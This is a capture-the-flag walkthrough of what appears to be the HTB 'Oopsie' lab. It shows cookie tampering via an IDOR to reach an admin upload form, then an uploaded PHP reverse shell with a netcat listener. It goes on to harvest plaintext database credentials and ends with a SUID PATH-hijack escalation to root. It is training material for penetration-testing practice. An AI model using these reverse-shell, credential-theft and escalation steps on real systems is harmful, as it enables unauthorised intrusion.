# 0. Theory

Cookies are text files with small pieces of data created by the web server, stored by the browser into the computer file system and being used to identify a user while is browsing a website.

Developer tools is a set of web developer tools built into Firefox. We can use them to examine, edit, and debug HTML, CSS, and JavaScript.

# 1. Recon

Verify target and availability.

We can spot port 22 (SSH) and port 80 (HTP) are open. Upon visiting the IP address using the web browser, we see a website.

![[Pasted image 20241006224828.png]]

According to the home page, visitors can access the services through login:
![[Pasted image 20241006225031.png]]

So, the website must have a login page.
Before we proceed with directory busting and page enumeration, we can try to map the website by using Burp Suite proxy to passively spider the website using its repeater, scanner, crawler, and other functions.

## Setting up Burp Suite
First, we configure the browser to send traffic through proxy.
Proxy settings are in the Preferences menu in Firefox (as of now). Then, we type in "proxy" to the search bar, and go to Network Settings section where we select `Settings...` / `Preferences...`.

Then we select `Manual proxy configuration` where we enter as an HTTP Proxy the `127.0.0.1` IP and port `8080`, where Burp Suit is going to listen to.
>*Note: It is advisable to also check the option of Also use this proxy for FTP and HTTPS so all requests can go through Burp.*

Now we need to disable the interception in Burp Suite as it's enabled by default.
We navigate to the `Proxy` tab, and under the `Intercept` subtab, select the button where `Intercept is on` so to disable it and turn it off.

## Spidering with Burp Suite
Now that everything is setup correctly we refresh the page in our browser and switch in Burp Suite under the Target tab and then on the Sitemap option:

![[Pasted image 20241006230542.png]]

It is possible to spot some directories and files that weren't visible while browsing. One that is indeed very interesting it's the directory of `/cdn-cgi/login`.
We can visit it in our browser and indeed we are presented with the login page:

![[Pasted image 20241006230659.png]]

After trying a couple of default username/password combinations, we didn't managed to get any access. But there is also an option to `Login as Guest`. Trying that and now we are presented with couple of new navigation options as we are logged in as Guest:

![[Pasted image 20241006230815.png]]

After navigating through the available pages, we spot that the only interesting one seems to be the `Uploads`. However it is not possible to access it as we need to have `super admin` rights:

![[Pasted image 20241006230908.png]]

## Enumerating on Cookies and Escalating Privilege
We need to find a way to escalate our privileges from user `Guest` to `super admin` role. One way to try this is by checking if cookies and sessions can be manipulated.

We open up Developer Tools in our browser (can be done via multiple ways, e.g. hitting `ctrl+shitf+C`).

Then we can navigate to `Storage` section where `Cookies` are being presented.
We can observe that there is a `role=guest` and `user=2233` which we can assume that if we somehow knew the number of `super admin` for the user variable, we might be able to gain access to the upload page.

When we are on the Account page, we can see that, in the url of the page, there is an `id` for every user:
`http://10.129.95.191/cdn-cgi/login/admin.php?content=accounts&id=2`

![[Pasted image 20241006232011.png]]

We check what happens if we simply change the id number in the browser's url bar. We see that we are met with an information disclosure vulnerability, as we get the access ID of the admin user this way.

![[Pasted image 20241006232030.png]]

We can abuse and exploit this vulnerability by editing our user cookie so the `user` value to be `34322` and role value to be `admin`. Then we can revisit the Uploads page.

![[Pasted image 20241006232205.png]]

And so we got access to the upload form.

# 3. Foothold

Now that we got access to the upload form we can attempt to upload a `PHP` reverse shell.
Instead of creating our own one, we will use an existing one.

In Parrot OS, it is possible to find webshells under the folder `/usr/share/webshells/`, however, we can also download it from [here](https://github.com/BlackArch/webshells).
For this exercise we are going to use the `/usr/share/webshells/php/php-reverse-shell.php`.

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP

//
// This tool may be used for legal purposes only. Users take full responsibility

// <SNIP>

set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS WITH YOUR IP
$port = 1234;       // CHANGE THIS WITH YOUR LISTENING PORT
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

// <SNIP>

?>
```

Of course we need to modify the above code so it can suit our needs. We are going to change the `$ip` and the `$port` variables to match our settings and then we will upload the file.

![[Pasted image 20241006233721.png]]

Having the script file uploaded, now we might need to bruteforce directories in order to locate the folder where the uploaded files are stored but we can also guess it. `uploads` directory seems a logical assumption. 

We confirm that by running also the **dirbuster tool** `gobuster`:

`gobuster dir --url http://{TARGET_IP}/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php`

Although `gobuster` immediately found the `/uploads` directory (`http://10.129.95.191/uploads/`), we don't have permission to access it. But we can try access our uploaded file.

![[Pasted image 20241006234510.png]]

But first, we will need to set up a netcat connection (with the port we have set in the uploaded reverse shell php script):
`nc -lvnp 1234`

Then request our shell through the browser url bar:
`http://10.129.95.191/uploads/php-reverse-shell.php`

And upon checking our listening netcat terminal, we can see a successfully connection attempt:

![[Pasted image 20241006235043.png]]

In order to have a functional shell though we can issue the following command:
`python3 -c 'import pty;pty.spawn("/bin/bash")'`

## Lateral Movement

### Casually finding the user flag
Upon wandering into the `home` directory, after a little sniffing around, we find straight leads to the user flag:

	www-data@oopsie:/home$ ls
	ls
	robert
	www-data@oopsie:/home$ cd robert
	cd robert
	www-data@oopsie:/home/robert$ ls
	ls
	user.txt
	www-data@oopsie:/home/robert$ cat user.txt
	cat user.txt
	f2c74ee8db7983851ab2a96a44eb7981

**User flag exfiltrated:** `f2c74ee8db7983851ab2a96a44eb7981`


As user `www-data` we can't achieve many things as the role has restricted access on the system. Since the website is making use of PHP and SQL we can enumerate further the web directory for potential disclosures or misconfigurations. After some search we can find some interesting php files under `/var/www/html/cdncgi/login` directory. 

	www-data@oopsie:/var/www/html/cdn-cgi/login$ ls
	ls
	admin.php  db.php  index.php  script.js

We can manually review the source code of all the pages or we can try search for interesting strings with the usage of `grep` tool. `grep` is a tool that searches for PATTERNS in each FILE and print lines that match the patterns. We can use `cat *` to read all files while pipeing the output to grep where we provide the pattern of a string that starts with the word `passw` and followed by any string such as for example words passwd or password. We can also use the switch `-i` to ignore case sensitive words like Password.

	www-data@oopsie:/var/www/html/cdn-cgi/login$ cat * | grep -i passw*
	cat * | grep -i passw*
	if($_POST["username"]==="admin" && $_POST["password"]==="MEGACORP_4dm1n!!")
	<input type="password" name="password" placeholder="Password" />

We got the password: `MEGACORP_4dm1n!!`.
We can check the available users on the system by reading the `/etc/passwd` file, so we can try a password reuse of this password.
But we already found the user folder for `robert` at this point.

We attempt to change the system user with the `su` command to `robert` and try the password we just found, for this user, but we have no luck:

	www-data@oopsie:/var/www/html/cdn-cgi/login$ su robert
	su robert
	Password: MEGACORP_4dm1n!!
	
	su: Authentication failure

We dig into the php files one by one, and we find something interesting in the `db.php` file.

	www-data@oopsie:/var/www/html/cdn-cgi/login$ cat db.php
	cat db.php
	<?php
	$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
	?>


Now that we got the password we can successfully login and read the `user.txt` flag which can be found in the home directory of `robert` (which we have found previously already):

	www-data@oopsie:/var/www/html/cdn-cgi/login$ su robert
	su robert
	Password: M3g4C0rpUs3r!
	
	robert@oopsie:/var/www/html/cdn-cgi/login$ ls /home/robert/
	ls /home/robert/
	user.txt


## Privilege Escalation

Before running any privilege escalation or enumeration script, let's check the basic commands for elevating privileges like `sudo` and `id`:

	robert@oopsie:/var/www/html/cdn-cgi/login$ sudo -l
	sudo -l
	[sudo] password for robert: M3g4C0rpUs3r!
	
	Sorry, user robert may not run sudo on oopsie.
	robert@oopsie:/var/www/html/cdn-cgi/login$ id
	id
	uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)


We observe that user `robert` is part of the group `bugtracker`. Let's try to see if there is any binary within that group:
`find / -group bugtracker 2>/dev/null`

	robert@oopsie:/var/www/html/cdn-cgi/login$ find / -group bugtracker 2>/dev/null
	<cdn-cgi/login$ find / -group bugtracker 2>/dev/null
	/usr/bin/bugtracker

We found a file named `bugtracker`. We check what privileges and what type of file is it:
`ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker`

	robert@oopsie:/var/www/html/cdn-cgi/login$ ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker
	
	-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
	/usr/bin/bugtracker: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=b87543421344c400a95cbbe34bbc885698b52b8d, not stripped

There is a suid set on that binary, which is a promising exploitation path.

>*Commonly noted as SUID (Set owner User ID), the special permission for the user access level has a single function: A file with SUID always executes as the user who owns the file, regardless of the user passing the command. If the file owner doesn't have execute permissions, then use an uppercase S here.*
>
>*In our case, the binary 'bugtracker' is owned by root & we can execute it as root since it has SUID set.*

So we will run the application to observe how it behaves:

	robert@oopsie:/var/www/html/cdn-cgi/login$ /usr/bin/bugtracker
	/usr/bin/bugtracker
		
	------------------
	: EV Bug Tracker :
	------------------
	
	Provide Bug ID: 12
	12
	---------------
	
	cat: /root/reports/12: No such file or directory


The tool is accepting user input as a name of the file that will be read using the `cat` command, however, it does not specifies the whole path to file `cat`, so we might be able to exploit this.

We navigate to `/tmp` directory and create a file named cat with the following content:
`/bin/sh`

We then set the execute privileges:
`chmod +x cat`

And, in order to exploit this we can add the `/tmp` directory to the PATH environmental variable:
`export PATH=/tmp:$PATH`

>*PATH is an environment variable on Unix-like operating systems, DOS, OS/2, and Microsoft Windows, specifying a set of directories where executable programs are located.*

Now, when we check the $PATH, we can read the following output:

	robert@oopsie:/tmp$ export PATH=/tmp:$PATH
	export PATH=/tmp:$PATH
	robert@oopsie:/tmp$ echo $PATH
	echo $PATH
	/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games

Finally, we execute the `bugtracker` from `/tmp` directory:

	robert@oopsie:/tmp$ bugtracker
	bugtracker
	
	------------------
	: EV Bug Tracker :
	------------------
	
	Provide Bug ID: 2
	2
	---------------
	
	# whoami
	whoami
	root


And we can see that we have root privilege on the machine.
We will use file transfer leveraging a `netcat` connection, because for some reason, we were not able to properly read the `root.txt` file's content neither with the `cat` command, nor by opening it with `vim`.
